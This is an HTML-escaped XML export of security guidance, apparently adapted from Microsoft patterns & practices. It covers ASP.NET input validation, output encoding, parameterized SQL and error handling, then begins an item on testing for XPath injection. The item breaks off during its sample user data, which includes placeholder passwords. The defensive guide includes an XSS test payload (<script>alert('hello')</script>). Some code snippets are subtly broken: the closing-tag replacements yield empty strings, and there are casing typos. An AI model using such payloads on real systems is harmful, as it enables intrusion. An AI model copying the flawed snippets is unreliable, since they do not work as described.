&lt;li&gt;Disable ASP.NET request validation by the adding the &lt;strong&gt;ValidateRequest=&amp;quot;false&amp;quot;&lt;/strong&gt; attribute to the
&lt;strong&gt;@ Page&lt;/strong&gt; directive. &lt;/li&gt;&lt;li&gt;Encode the string input with the &lt;strong&gt;HtmlEncode&lt;/strong&gt; method. &lt;/li&gt;&lt;li&gt;Use a &lt;strong&gt;StringBuilder&lt;/strong&gt; and call its Replace method to selectively remove the encoding on the HTML elements that you want to permit.
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;The following .aspx page code shows this approach. The page disables ASP.NET request validation by setting
&lt;strong&gt;ValidateRequest=&amp;quot;false&amp;quot;&lt;/strong&gt;. It HTML-encodes the input and selectively allows the &amp;lt;&lt;strong&gt;b&lt;/strong&gt;&amp;gt; and &amp;lt;&lt;strong&gt;i&lt;/strong&gt;&amp;gt; HTML elements to support simple text formatting.
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; ValidateRequest=&amp;quot;false&amp;quot;%&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;nbsp; void submitBtn_Click(object sender, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Encode the string input&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; StringBuilder sb = new StringBuilder(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; AntiXSSLibrary.HtmlEncode(htmlInputTxt.Text));&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Selectively allow&amp;nbsp; and &amp;lt;i&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; sb.Replace(&amp;quot;&amp;amp;lt;b&amp;amp;gt;&amp;quot;, &amp;quot;&amp;lt;b&amp;gt;&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; sb.Replace(&amp;quot;&amp;amp;lt;/b&amp;amp;gt;&amp;quot;, &amp;quot;&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; sb.Replace(&amp;quot;&amp;amp;lt;i&amp;amp;gt;&amp;quot;, &amp;quot;&amp;lt;i&amp;gt;&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; sb.Replace(&amp;quot;&amp;amp;lt;/i&amp;amp;gt;&amp;quot;, &amp;quot;&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(sb.ToString());&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;html&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:TextBox ID=&amp;quot;htmlInputTxt&amp;quot; Runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; TextMode=&amp;quot;MultiLine&amp;quot; Width=&amp;quot;318px&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Height=&amp;quot;168px&amp;quot;&amp;gt;&amp;lt;/asp:TextBox&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button ID=&amp;quot;submitBtn&amp;quot; Runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Text=&amp;quot;Submit&amp;quot; OnClick=&amp;quot;submitBtn_Click&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;h2&gt;Validate Query String Values&lt;/h2&gt;
&lt;p&gt;Validate query string values for length, range, format, and type. You usually do this by using a combination of regular expressions to:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Constrain the input values. &lt;/li&gt;&lt;li&gt;Set explicit range checks. &lt;/li&gt;&lt;li&gt;Specify the explicit type checks performed by converting the input value to its equivalent .NET Framework type and handling any ensuing conversion errors.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;The following code example shows how to use the &lt;strong&gt;Regex&lt;/strong&gt; class to validate a name string passed on a query string.
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;void Page_Load(object sender, EventArgs e)&lt;br&gt;{&lt;br&gt;&amp;nbsp; if (!System.Text.RegularExpressions.Regex.IsMatch(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Request.QueryString[&amp;quot;Name&amp;quot;], @&amp;quot;^[a-zA-Z'.\s]{1,40}$&amp;quot;))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Invalid name parameter&amp;quot;);&lt;br&gt;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(&amp;quot;Name is &amp;quot; &amp;#43; Request.QueryString[&amp;quot;Name&amp;quot;]);&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;h2&gt;Validate Cookie Values&lt;/h2&gt;
&lt;p&gt;Values maintained in cookies, such as query string parameters, can easily be manipulated by a client. Validate cookie values in the same way as you would for query string parameters. Validate them for length, range, format, and type.&lt;/p&gt;
&lt;h2&gt;Validate File and URL Paths&lt;/h2&gt;
&lt;p&gt;If your application has to accept input file names, file paths, or URL paths, you need to validate that the path is in the correct format and that it points to a valid location within the context of your application. Failure to do this can result in attackers
 persuading your application into accessing arbitrary files and resources. &lt;/p&gt;
&lt;h3&gt;Validating File Paths&lt;/h3&gt;
&lt;p&gt;To prevent a malicious user manipulating your code's file operations, avoid writing code that accepts user-supplied file or path input. For example:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;If you must accept file names as input, use the full name of the file by using
&lt;strong&gt;System.IO.Path.GetFileName&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;If you must accept file paths as input, use the full file path by using &lt;strong&gt;
System.IO.Path.GetFullPath&lt;/strong&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;h3&gt;Using MapPath to Prevent Cross Application Mapping&lt;/h3&gt;
&lt;p&gt;If you use &lt;strong&gt;MapPath&lt;/strong&gt; to map a supplied virtual path to a physical path on the server, use the overload of
&lt;strong&gt;Request.MapPath&lt;/strong&gt; that accepts a &lt;strong&gt;bool&lt;/strong&gt; parameter so that you can prevent cross-application mapping. The following code example shows this technique.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;try&lt;br&gt;{&lt;br&gt;&amp;nbsp; string mappedPath = Request.MapPath( inputPath.Text, &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Request.ApplicationPath, false);&lt;br&gt;}&lt;br&gt;catch (HttpException)&lt;br&gt;{&lt;br&gt;&amp;nbsp; // Cross-application mapping attempted&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The final &lt;strong&gt;false&lt;/strong&gt; parameter prevents cross-application mapping. This means that a user cannot successfully supply a path that contains
&lt;strong&gt;&amp;quot;..&amp;quot;&lt;/strong&gt; to traverse outside of your application's virtual directory hierarchy. Any attempt to do this results in an exception of type
&lt;strong&gt;HttpException&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;If you use server controls, you can use the &lt;strong&gt;Control.MapPathSecure&lt;/strong&gt; method to retrieve the physical path to which the virtual path is mapped.
&lt;strong&gt;Control.MapPathSecure&lt;/strong&gt; uses code access security and throws an &lt;strong&gt;
HttpException&lt;/strong&gt; if the server control does not have permissions to read the resulting mapped file. For more information, see
&lt;strong&gt;Control.MapPathSecure&lt;/strong&gt; in the .NET Framework SDK documentation.&lt;/p&gt;
&lt;h3&gt;Using Code Access Security to Restrict File I/O&lt;/h3&gt;
&lt;p&gt;An administrator can restrict an application's file I/O to its own virtual directory hierarchy by configuring the application to run with Medium trust. In this event, .NET code access security ensures that no file access is permitted outside of the application's
 virtual directory hierarchy.&lt;/p&gt;
&lt;p&gt;You configure an application to run with Medium trust by setting the &amp;lt;&lt;strong&gt;trust&lt;/strong&gt;&amp;gt; element in Web.config or Machine.config.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;trust level=&amp;quot;Medium&amp;quot; /&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;h3&gt;Validating URLs&lt;/h3&gt;
&lt;p&gt;You can filter for a valid URL format using a regular expression, such as the following.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;^(?:http|https|ftp)://[a-zA-Z0-9\.\-]&amp;#43;(?:\:\d{1,5})?(?:[A-Za-z0-9\.\;\:\@\&amp;amp;\=\&amp;#43;\$\,\?/]|%u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2})*$  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This constrains the input, but it does not validate whether the URL is valid in terms of the application boundaries. You should check whether the target is valid in the context of your application. For example, does it point to an authorized server that
 you expect your application to communicate with?&lt;/p&gt;
&lt;h1&gt;Step 3. Encode Unsafe Output&lt;/h1&gt;
&lt;p&gt;If you write text output to a Web page, encode it using &lt;strong&gt;AntiXSSLibrary.HtmlEncode&lt;/strong&gt;. Do this if the text came from user input, a database, or a local file.
&lt;/p&gt;
&lt;p&gt;Similarly, if you write URLs that might contain unsafe characters because they have been constructed from input data or data from a shared database, use
&lt;strong&gt;AntiXSSLibrary.UrlEncode&lt;/strong&gt; to make them safe. &lt;/p&gt;
&lt;p&gt;Avoid the mistake of encoding the data early. Make sure you encode at the last possible opportunity before the data is displayed to the client.
&lt;/p&gt;
&lt;p&gt;Do not use the &lt;strong&gt;HttpUtilty &lt;/strong&gt;class provided by ASP.NET as it does not do a complete job of protecting against cross site scripting attacks, the
&lt;strong&gt;AntiXSSLibrary &lt;/strong&gt;is much more effective.&lt;/p&gt;
&lt;h2&gt;Use HtmlEncode to Encode Unsafe Output&lt;/h2&gt;
&lt;p&gt;The &lt;strong&gt;HtmlEncode&lt;/strong&gt; method replaces characters that have special meaning in HTML to HTML variables that represent those characters. For example, &amp;lt; is replaced with
&lt;strong&gt;&amp;amp;lt;&lt;/strong&gt; and &lt;strong&gt;&amp;quot;&lt;/strong&gt; is replaced with &lt;strong&gt;&amp;amp;quot;&lt;/strong&gt;. Encoded data does not cause the browser to execute code. Instead, the data is rendered as harmless text, and the tags are not interpreted as HTML.&lt;/p&gt;
&lt;p&gt;To illustrate the use of &lt;strong&gt;HtmlEncode&lt;/strong&gt;, the following page accepts input from the user and allows potentially unsafe HTML characters by setting
&lt;strong&gt;ValidateRequest=&amp;quot;false&amp;quot;&lt;/strong&gt;. Before writing the input back to the user, the code calls
&lt;strong&gt;AntiXSSLibrary.HtmlEncode&lt;/strong&gt; on the supplied input text. This renders any potentially unsafe HTML as harmless text.
&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; ValidateRequest=&amp;quot;false&amp;quot; %&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; void submitBtn_Click(object sender, EventArgs e)&lt;br&gt;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Response.Write(AntiXSSLibrary.HtmlEncode(inputTxt.Text));&lt;br&gt;&amp;nbsp; }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;/pre&gt;
&lt;pre&gt;&amp;lt;html&amp;nbsp; &amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:TextBox ID=&amp;quot;inputTxt&amp;quot; Runat=&amp;quot;server&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; TextMode=&amp;quot;MultiLine&amp;quot; Width=&amp;quot;382px&amp;quot; Height=&amp;quot;152px&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/asp:TextBox&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button ID=&amp;quot;submitBtn&amp;quot; Runat=&amp;quot;server&amp;quot; Text=&amp;quot;Submit&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OnClick=&amp;quot;submitBtn_Click&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To see the effect of the HTML encoding, place the preceding page in a virtual directory, browse to it, enter some HTML code in the input text box, and click
&lt;strong&gt;Submit&lt;/strong&gt;. For example, the following input is rendered as text.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Run script and say hello &amp;lt;script&amp;gt;alert('hello');&amp;lt;/script&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;It produces the following safe output.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;Run script and say hello &amp;lt;script&amp;gt;alert('hello');&amp;lt;/script&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;If you remove the call to &lt;strong&gt;HtmlEncode&lt;/strong&gt; and simply write back the input, the browser executes the script and displays a message box. Malicious script could pose a significant threat.
&lt;/p&gt;
&lt;h2&gt;Use UrlEncode to Encode Unsafe URLs&lt;/h2&gt;
&lt;p&gt;If you need to write URLs that are based on input that you do not fully trust, use
&lt;strong&gt;AntiXSSLibrary.UrlEncode&lt;/strong&gt; to encode the URL string.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;AntiXSSLibrary.UrlEncode( urlString );  &lt;/pre&gt;
&lt;/div&gt;
&lt;h1&gt;Step 4. Use Command Parameters for SQL Queries&lt;/h1&gt;
&lt;p&gt;To help prevent SQL injection, use command parameters for SQL queries. The &lt;strong&gt;
Parameters&lt;/strong&gt; collection provides type checking and length validation. If you use the
&lt;strong&gt;Parameters&lt;/strong&gt; collection, input is treated as a literal value and SQL does not treat it as executable code. An additional benefit of using the
&lt;strong&gt;Parameters&lt;/strong&gt; collection is that you can enforce type and length checks. Values outside of the range trigger an exception.&lt;/p&gt;
&lt;h2&gt;Use Parameters Collection When You Call a Stored Procedure&lt;/h2&gt;
&lt;p&gt;The following code fragment illustrates the use of the &lt;strong&gt;Parameters&lt;/strong&gt; collection when calling a stored procedure.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;SqlDataAdapter myCommand = new SqlDataAdapter(&amp;quot;AuthorLogin&amp;quot;, &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; myConnection);&lt;br&gt;myCommand.SelectCommand.CommandType = CommandType.StoredProcedure;&lt;br&gt;SqlParameter parm = myCommand.SelectCommand.Parameters.Add(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;@LoginId&amp;quot;, SqlDbType.VarChar, 11);&lt;br&gt;parm.Value = Login.Text;  &lt;/pre&gt;
&lt;/div&gt;
&lt;h2&gt;Use Parameters Collection When Building Your SQL Statements&lt;/h2&gt;
&lt;p&gt;If you cannot use stored procedures, you can still use parameters, as shown in the following code fragment.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;SqlDataAdapter myCommand = new SqlDataAdapter(&lt;br&gt;&amp;quot;SELECT au_lname, au_fname FROM Authors WHERE au_id = @au_id&amp;quot;, myConnection);&lt;br&gt;SQLParameter parm = myCommand.SelectCommand.Parameters.Add(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;quot;@au_id&amp;quot; ,SqlDbType.VarChar, 11);&lt;br&gt;Parm.Value = Login.Text;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;For more information about how to prevent SQL injection, see &lt;a href="http://msdn2.microsoft.com/en-us/library/ms998271.aspx"&gt;
How to: Protect From SQL Injection in ASP.NET&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;Step 5. Verify that ASP.NET Errors Are Not Returned to the Client&lt;/h1&gt;
&lt;p&gt;You can use the &amp;lt;&lt;strong&gt;customErrors&lt;/strong&gt;&amp;gt; element to configure custom, generic error messages that should be returned to the client in the event of an application exception condition.&lt;/p&gt;
&lt;p&gt;Make sure that the &lt;strong&gt;mode&lt;/strong&gt; attribute is set to &lt;strong&gt;&amp;quot;remoteOnly&amp;quot;&lt;/strong&gt; in the web.config file as shown in the following example.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;customErrors mode=&amp;quot;remoteOnly&amp;quot; /&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;After installing an ASP.NET application, you can configure the setting to point to your custom error page as shown in the following example.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;customErrors mode=&amp;quot;On&amp;quot; defaultRedirect=&amp;quot;YourErrorPage.htm&amp;quot; /&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>6f1b7e6d-ebea-4011-81d8-82cac1dadf69</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>How to Test for XPath Injection Bugs</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Test</phase>
    <rule_Type>How To</rule_Type>
    <priority>Andres De Vivanco</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;p&gt;&lt;strong&gt;&amp;nbsp;&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;Applies to:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web applications that use XPath to query XML data. Usually these applications are developed using ASP .Net, Java, PHP, Python and Ruby.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Summary&lt;/h1&gt;
&lt;p&gt;XPath is a language to query over XML data.&amp;nbsp; Even though XPath is only used for querying data, it suffers from an injection vulnerability similar to SQL Injection.&amp;nbsp; An attacker that manipulates the parameters used in an XPath query can modify the logic of
 an original query to perform an authentication bypass or execute information disclosure attacks.
&lt;/p&gt;
&lt;p&gt;It is recommended that you follow these steps to test for XPath Injection vulnerabilities:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step 1:&amp;nbsp; Understand Attack Scenarios &lt;/li&gt;&lt;li&gt;Step 2:&amp;nbsp; Analyze Causes and Countermeasures &lt;/li&gt;&lt;li&gt;Step 3:&amp;nbsp; Start Testing and Exploring &lt;/li&gt;&lt;li&gt;Step 4:&amp;nbsp; Fine-tune Test Cases&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Step 1:&amp;nbsp; Understand Attack Scenarios&lt;/h1&gt;
&lt;p&gt;First, you must understand the details of XPath attack scenarios.&amp;nbsp; Similar to SQL injection, there are two types of XPath attacks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Normal XPath Injection &lt;/li&gt;&lt;li&gt;Blind XPath Injection&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;h2&gt;&lt;em&gt;Scenario 1: Normal XPath Injection &lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;In order to follow this and the next scenario, you must understand the background for XPath queries.&amp;nbsp;&amp;nbsp; XPath is a language that queries on XML data such as the file below:&lt;/p&gt;
&lt;pre&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1&amp;quot;?&amp;gt; &lt;br&gt;&amp;lt;users&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;user&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;username&amp;gt;johns&amp;lt;/username&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password&amp;gt;abc123&amp;lt;/password&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;fullname&amp;gt;John Smith&amp;lt;/fullname&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/user&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;user&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;username&amp;gt;billg&amp;lt;/username&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password&amp;gt;qwerty&amp;lt;/password&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;fullname&amp;gt;Bill Graves&amp;lt;/fullname&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/user&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;user&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;username&amp;gt;mrt&amp;lt;/username&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;password&amp;gt;pr1v@t3&amp;lt;/password&amp;gt; 